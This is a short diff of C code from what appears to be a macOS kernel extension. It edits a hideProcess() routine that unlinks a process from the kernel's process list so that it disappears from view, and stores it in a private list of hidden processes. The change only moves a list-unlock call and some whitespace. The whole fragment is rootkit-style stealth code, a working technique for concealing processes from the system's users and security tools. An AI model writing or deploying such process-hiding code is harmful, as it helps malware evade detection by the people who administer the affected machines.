@@ -54,19 +54,20 @@ hideProcess(pid_t pid) {
             /* Actually hdie the process. */
             LIST_REMOVE(process, p_list);
             
+            /* Unlock the list */
+            proc_list_unlock();
+            
             /* Add it to our list */
             char tagStr[101];
             snprintf(tagStr, 100, "hiddenProc-%i", process->p_pid);
             OSMallocTag tag = OSMalloc_Tagalloc(tagStr, OSMT_DEFAULT);
+            
             struct hiddenProc *item = OSMalloc(sizeof(struct hiddenProc), tag);
+            
             item->process = process;
             item->tag = tag;
             
-            
             LIST_INSERT_HEAD(&hidden_procs_head, item, processes);
-            
-            /* Unlock the list */
-            proc_list_unlock();
             
             return KERN_SUCCESS;
         }
